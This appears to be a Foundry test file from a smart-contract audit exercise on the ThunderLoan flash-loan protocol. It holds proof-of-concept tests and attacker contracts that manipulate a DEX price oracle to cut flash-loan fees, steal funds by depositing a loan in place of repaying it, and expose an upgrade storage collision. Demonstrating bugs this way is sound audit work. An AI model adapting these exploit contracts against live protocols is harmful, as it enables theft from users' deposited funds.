```PUT EVERYTHING UNDET `THUNDERLOANTEST.T.SOL` FILE```

function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();
        //total withddraw is happeening --> 1003300900000000000000
        //Deposite --> 1000e18
        //fees --> 300000000000000000 --> 3e17
        // depo + fees
        // 1000e18 + 3e17 = 10003e17
        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }

    function testOracle() public {
        //1. Deploy ThunderLoan and create a pool
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory poolFactory = new BuffMockPoolFactory(
            address(weth)
        );
        address tswapPool = poolFactory.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(poolFactory));

        //2Funding tSwap

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);

        BuffMockTSwap(tswapPool).deposit(
            100e18,
            100e18,
            100e18,
            block.timestamp
        );
        vm.stopPrank();
        //ration  1:1

        //3 Fund ThunderLoan contract

        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        // 100 weth and 100 tokenA in tswap
        // 1000 tokenA in ThunderLoan

        //4. Flashloan
        //  Now, taing out a flash loan of 50 token A.
        // swap it on the dex, tanking the price>  150 tokenA -> ~80 weth maybe!!
        // take ut another falsh lona of 50 tokenA and it will be so cheaper from which we can proof this.

        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal Fee Cost: ", normalFeeCost);
        // 0.296147410319118389
        uint256 amountToBorrow = 50e18;
        MFlashLoan mFlashLoan = new MFlashLoan(
            address(tswapPool),
            address(thunderLoan),
            address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(mFlashLoan), 100e18);
        thunderLoan.flashloan(address(mFlashLoan), tokenA, amountToBorrow, "");
        vm.stopPrank();
        uint256 attackFee = mFlashLoan.feeOne() + mFlashLoan.feeTwo();
        console2.log("Attack Fee: ", attackFee);
        assert(attackFee < normalFeeCost);
    }

    function testUseDepositeInsteadOfRepayToStealFunds()
        public
        setAllowedToken
        hasDeposits
    {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay depositOverRepay = new DepositOverRepay(
            address(thunderLoan)
        );
        tokenA.mint(address(depositOverRepay), fee);

        thunderLoan.flashloan(
            address(depositOverRepay),
            tokenA,
            amountToBorrow,
            ""
        );
        depositOverRepay.redeemMoney();
        vm.stopPrank();
        assert(tokenA.balanceOf(address(depositOverRepay)) > 50e18 + fee);
    }

    function testupgradeStoragrCollision() public {
        uint256 feeBefore = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded thunderLoanUpgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(thunderLoanUpgraded), "");
        uint256 feeAfterUpdate = thunderLoan.getFee();
        vm.stopPrank();
        console2.log("Fee Before: ", feeBefore);
        console2.log("Fee After: ", feeAfterUpdate);
        assert(feeBefore != feeAfterUpdate);
    }
}

contract MFlashLoan is IFlashLoanReceiver {
    //1. swap tokenA for weth
    //2. take out another flash loan, to show up the diffecrence.
    ThunderLoan thunderLoan;
    BuffMockTSwap tSwapPool;
    address repayAddress;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(
        address _tSwapPool,
        address _thunderLoan,
        address _repayAddress
    ) {
        tSwapPool = BuffMockTSwap(_tSwapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 wethAmount = tSwapPool.getOutputAmountBasedOnInput(
                50e18,
                100e18,
                100e18
            );
            IERC20(token).approve(address(tSwapPool), 50e18);
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(
                50e18,
                wethAmount,
                block.timestamp
            );
            // calling second flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            feeTwo = fee;
            //repay
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amt = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amt);
    }
}
